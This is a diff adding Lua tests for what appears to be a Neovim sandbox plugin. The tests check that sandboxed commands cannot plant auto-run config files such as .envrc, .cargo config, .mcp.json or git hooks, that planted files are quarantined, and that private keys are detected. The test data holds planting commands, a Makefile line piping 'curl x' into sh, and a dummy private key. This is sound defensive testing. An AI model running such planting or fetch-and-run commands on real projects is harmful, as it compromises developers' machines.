@@ -226,3 +226,266 @@ describe("F2: project files that run on your machine are locked", function()
       "nothing to list: no section")
   end)
 end)
+
+-- ------------------------------------------------------------------ F1
+describe("F1: names that act outside the sandbox cannot be created in a subdirectory", function()
+  local PLANTS = {
+    "mkdir -p sub/.cargo && echo '[target.x]' > sub/.cargo/config.toml",
+    "mkdir -p sub/.claude && echo '{}' > sub/.claude/settings.json",
+    "echo '{}' > sub/.mcp.json",
+    "mkdir -p sub/.vscode && echo '{}' > sub/.vscode/tasks.json",
+    "echo 'export X=1' > sub/.envrc",
+    "echo 'os.execute(1)' > sub/.nvim.lua",
+    "echo 'x' > sub/.exrc",
+    "echo '[tasks]' > sub/.mise.toml",
+    "mkdir -p sub/.git/hooks && echo '#!/bin/sh' > sub/.git/hooks/pre-commit",
+  }
+
+  it("in the shallow subdirectories every plant fails and nothing is left or reported", function()
+    local project = H.tmpdir()
+    vim.fn.mkdir(project .. "/sub", "p")
+    write(project .. "/sub/lib.rs", "// code\n")
+    local script = table.concat(vim.tbl_map(function(c)
+      return c .. " 2>/dev/null"
+    end, PLANTS), "\n") .. "\necho done"
+    local out, h = inside(project, script, true)
+    H.match(out, "done", true, out)
+    local msgs = H.capture_notify(function()
+      h.release()
+    end)
+    H.eq({}, h.planted, "nothing was created, so nothing is quarantined")
+    for _, rel in ipairs({ ".cargo", ".claude", ".mcp.json", ".vscode", ".envrc", ".nvim.lua", ".exrc", ".mise.toml", ".git" }) do
+      H.eq(nil, uv.fs_lstat(project .. "/sub/" .. rel), "sub/" .. rel .. " must not exist on the host")
+    end
+    H.eq(0, #msgs)
+    H.eq(nil, sb.dirty(project))
+  end)
+
+  it("git still works inside a subdirectory of a repository while the .git placeholder is mounted", function()
+    local project = H.tmpdir()
+    H.git(project, "init", "-q", ".")
+    write(project .. "/sub/f.txt", "hi\n")
+    local out = inside(project, "cd sub && git rev-parse --show-toplevel && git status --short | head -3 && echo done")
+    H.match(out, "done", true, out)
+    H.match(out, project, true, out)
+    H.no_match(out, "fatal", true, out)
+  end)
+
+  it("the mask budget is bounded and the shallowest directories come first", function()
+    local extra = {}
+    for i = 1, 100 do
+      extra[("%s/d%03d"):format(PROJECT, i)] = "directory"
+    end
+    extra[PROJECT .. "/zz"] = "directory"
+    extra[PROJECT .. "/zz/deep"] = "directory"
+    extra[PROJECT .. "/zz/deep/er"] = "directory"
+    local p = build(extra)
+    H.eq(plan.SUBDIR_MASK_MAX, p.subdir_masks)
+    local masked = {}
+    for _, m in ipairs(p.masks) do
+      masked[m.path] = true
+    end
+    for _, g in ipairs(p.guard_files) do
+      masked[g.path] = true
+    end
+    H.ok(masked[PROJECT .. "/d001/.claude"], "a shallow directory is covered")
+    H.not_ok(masked[PROJECT .. "/zz/deep/er/.claude"], "the deepest one is beyond the budget (covered by the sweep)")
+    H.match(table.concat(p.notes, "\n"), "moved into a quarantine", true)
+  end)
+
+  it("never below a hidden directory or a read-only path (a mount point cannot be created there)", function()
+    local p = build({ [PROJECT .. "/.github"] = "directory", [PROJECT .. "/.github/workflows"] = "directory",
+      [PROJECT .. "/.config"] = "directory", [PROJECT .. "/.config/mise"] = "directory", [PROJECT .. "/.config/mise/.x"] = "file" })
+    for _, m in ipairs(p.masks) do
+      H.no_match(m.path, "/%.github/workflows/", false, m.path)
+      H.no_match(m.path, "/%.config/mise/", false, m.path)
+    end
+  end)
+end)
+
+-- ------------------------------------------------- F1: the end-of-run sweep
+describe("F1: what a run creates beyond the masks is quarantined, the project is marked, the next launch is refused", function()
+  local function tree()
+    local project = H.tmpdir()
+    write(project .. "/src/a/b/c/lib.rs", "// x\n")
+    write(project .. "/Cargo.toml", "[package]\nname = \"p\"\n")
+    write(project .. "/old/.envrc", "# mine\n")
+    return project
+  end
+
+  it("snapshot + compare see a new protected name at any depth, not an old one", function()
+    local project = tree()
+    local before = guard.snapshot(project)
+    H.ok(before.protected[project .. "/old/.envrc"])
+    write(project .. "/src/a/b/c/.cargo/config.toml", "[build]\n")
+    write(project .. "/src/a/b/c/.nvim.lua", "x\n")
+    write(project .. "/src/.config/mise.toml", "x\n")
+    write(project .. "/src/.config/mise/config.toml", "x\n")
+    write(project .. "/rust-toolchain.toml", "x\n")
+    local res = guard.compare(before, guard.snapshot(project))
+    local rel = vim.tbl_map(function(p)
+      return p:sub(#project + 2)
+    end, res.planted)
+    H.eq({ "rust-toolchain.toml", "src/.config/mise", "src/.config/mise.toml", "src/a/b/c/.cargo", "src/a/b/c/.nvim.lua" }, rel)
+    H.eq({}, res.modified)
+  end)
+
+  it("a change of an existing protected file is reported as modified, a change inside .git is not", function()
+    local project = tree()
+    vim.fn.mkdir(project .. "/.git", "p")
+    write(project .. "/.git/index", "1")
+    local before = guard.snapshot(project)
+    write(project .. "/old/.envrc", "# changed and longer\n")
+    write(project .. "/.git/index", "22222")
+    local res = guard.compare(before, guard.snapshot(project))
+    H.eq({ project .. "/old/.envrc" }, res.modified)
+    H.eq({}, res.planted)
+  end)
+
+  it("quarantine keeps a copy, removes the original and never follows a planted symlink", function()
+    local project = tree()
+    local outside = H.tmpdir()
+    write(outside .. "/precious.txt", "keep\n")
+    write(project .. "/sub/.envrc", "evil\n")
+    vim.fn.mkdir(project .. "/sub2", "p")
+    uv.fs_symlink(outside, project .. "/sub2/.cargo")
+    local q = guard.quarantine(project, { project .. "/sub/.envrc", project .. "/sub2/.cargo" })
+    H.eq(nil, uv.fs_lstat(project .. "/sub/.envrc"))
+    H.eq(nil, uv.fs_lstat(project .. "/sub2/.cargo"))
+    H.eq("keep\n", read(outside .. "/precious.txt"), "the symlink's target is untouched")
+    H.eq("evil\n", read(q.dir .. "/sub/.envrc"))
+    H.eq(outside, uv.fs_readlink(q.dir .. "/sub2/.cargo"))
+  end)
+
+  it("a planted name makes wrap() refuse the project until the mark is cleared", function()
+    H.need_sandbox()
+    local project = tree()
+    for i = 1, 60 do
+      vim.fn.mkdir(project .. ("/a%02d"):format(i), "p")
+    end
+    vim.fn.mkdir(project .. "/zz/er/est", "p")
+    sb.config.network = "open"
+    local cmd, err, h = sb.wrap({ "bash", "-c", "echo evil > zz/er/est/.envrc; mkdir -p zz/er/est/.cargo; echo '[build]' > zz/er/est/.cargo/config.toml" }, project, H.tmpdir())
+    H.ok(cmd, err)
+    vim.system(cmd, { cwd = project, text = true }):wait(60000)
+    local msgs = H.capture_notify(function()
+      h.release()
+    end)
+    H.eq(2, #h.planted)
+    H.eq(nil, uv.fs_lstat(project .. "/zz/er/est/.envrc"))
+    local errors = vim.tbl_filter(function(m)
+      return m[2] == vim.log.levels.ERROR
+    end, msgs)
+    H.eq(1, #errors)
+    H.match(errors[1][1], "refused until you review", true)
+    local c2, why = sb.wrap({ "true" }, project, H.tmpdir())
+    H.eq(nil, c2)
+    H.match(why, "XynoSandboxReview", true)
+    H.match(why, "zz/er/est/.envrc", true)
+    -- another project is not affected
+    local other = H.tmpdir()
+    local c3, e3, h3 = sb.wrap({ "true" }, other, H.tmpdir())
+    H.ok(c3, e3)
+    h3.release()
+    H.ok(sb.clear_dirty(project))
+    local c4, e4, h4 = sb.wrap({ "true" }, project, H.tmpdir())
+    H.ok(c4, e4)
+    h4.release()
+  end)
+
+  it(":XynoSandboxReview shows the pending files and `clear` removes the mark", function()
+    require("xyno_sandbox.run").register({ commands = true })
+    local project = tree()
+    guard.mark_dirty(project, { planted = { project .. "/x/.envrc" }, quarantine = "/q/dir" })
+    local got = H.capture_notify(function()
+      vim.cmd("XynoSandboxReview show " .. vim.fn.fnameescape(project))
+    end)
+    H.match(got[1][1], project .. "/x/.envrc", true)
+    H.match(got[1][1], "/q/dir", true)
+    H.match(got[1][1], "XynoSandboxReview clear", true)
+    H.ok(sb.dirty(project))
+    vim.cmd("XynoSandboxReview clear " .. vim.fn.fnameescape(project))
+    H.eq(nil, sb.dirty(project))
+    pcall(vim.api.nvim_del_user_command, "XynoSandboxReview")
+    for _, c in ipairs({ "XynoSandboxStatus", "XynoSandboxPolicy", "XynoSandboxApprovals", "XynoSandboxRun" }) do
+      pcall(vim.api.nvim_del_user_command, c)
+    end
+  end)
+
+  it("an edit of a file that runs later is summarised (lines added and removed), a new workflow too", function()
+    local project = tree()
+    write(project .. "/Makefile", "all:\n\techo 1\n")
+    write(project .. "/.github/workflows/ci.yml", "on: push\n")
+    local before = guard.snapshot(project)
+    write(project .. "/Cargo.toml", "[package]\nname = \"p\"\nbuild = \"evil.rs\"\n")
+    write(project .. "/Makefile", "all:\n\tcurl x | sh\n")
+    write(project .. "/.github/workflows/new.yml", "on: push\njobs: {}\n")
+    write(project .. "/build.rs", "fn main() {}\n")
+    local res = guard.compare(before, guard.snapshot(project))
+    local by = {}
+    for _, r in ipairs(res.review) do
+      by[r.path:sub(#project + 2)] = r
+    end
+    H.eq("changed", by["Cargo.toml"].change)
+    H.eq({ 1, 0 }, { by["Cargo.toml"].plus, by["Cargo.toml"].minus })
+    H.eq({ 1, 1 }, { by["Makefile"].plus, by["Makefile"].minus })
+    H.eq("created", by[".github/workflows/new.yml"].change)
+    H.eq("created", by["build.rs"].change)
+    H.eq(nil, by[".github/workflows/ci.yml"], "an unchanged file is not reported")
+    local text = table.concat(guard.report(res), "\n")
+    H.match(text, "Cargo.toml +1 -0", true)
+    H.match(text, "Makefile +1 -1", true)
+  end)
+
+  it("the walk is bounded and says so", function()
+    local project = H.tmpdir()
+    local old = guard.MAX_DIRS
+    guard.MAX_DIRS = 5
+    for i = 1, 20 do
+      vim.fn.mkdir(project .. "/d" .. i, "p")
+    end
+    local snap = guard.snapshot(project)
+    guard.MAX_DIRS = old
+    H.ok(snap.truncated)
+    H.match(snap.why, "directories", true)
+  end)
+end)
+
+-- ------------------------------------------------------------------ F3
+describe("F3: the content scan reads small files whatever they are called", function()
+  local scan = require("xyno_sandbox.scan")
+  local KEY = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk=\n-----END OPENSSH PRIVATE KEY-----\n"
+  local NAMES = { "key.lock", "k.map", "k.db", "k.sqlite", "k.a", "k.o", "k.png", "k.zip", "k.jar", "k.so", "k.woff2", "k.rlib", "k.pyc", "noext" }
+
+  it("a private key in a file with any extension is found", function()
+    local dir = H.tmpdir()
+    for _, n in ipairs(NAMES) do
+      write(dir .. "/" .. n, KEY)
+    end
+    local res = scan.project(dir)
+    H.eq(#NAMES, #res.hits, vim.inspect(res.hits))
+    H.eq(0, res.unread.binary)
+  end)
+
+  it("a file with a NUL byte or over the size limit is still skipped, and counted", function()
+    local dir = H.tmpdir()
+    write(dir .. "/k.db", "SQLite format 3\0" .. KEY)
+    write(dir .. "/big.lock", KEY .. ("x"):rep(scan.MAX_FILE_BYTES + 1))
+    local res = scan.project(dir)
+    H.eq(0, #res.hits)
+    H.eq(1, res.unread.binary)
+    H.eq(1, res.unread.large)
+  end)
+
+  it("such a file is hidden in a real plan (key.lock with a private key)", function()
+    local project = H.tmpdir()
+    write(project .. "/key.lock", KEY)
+    write(project .. "/readme.txt", "hello\n")
+    local p = assert(sb.plan({ "true" }, project, H.tmpdir()))
+    local found = false
+    for _, h in ipairs(p.hidden) do
+      found = found or h.path == project .. "/key.lock"
+    end
+    H.ok(found, "key.lock is hidden")
+  end)
+end)
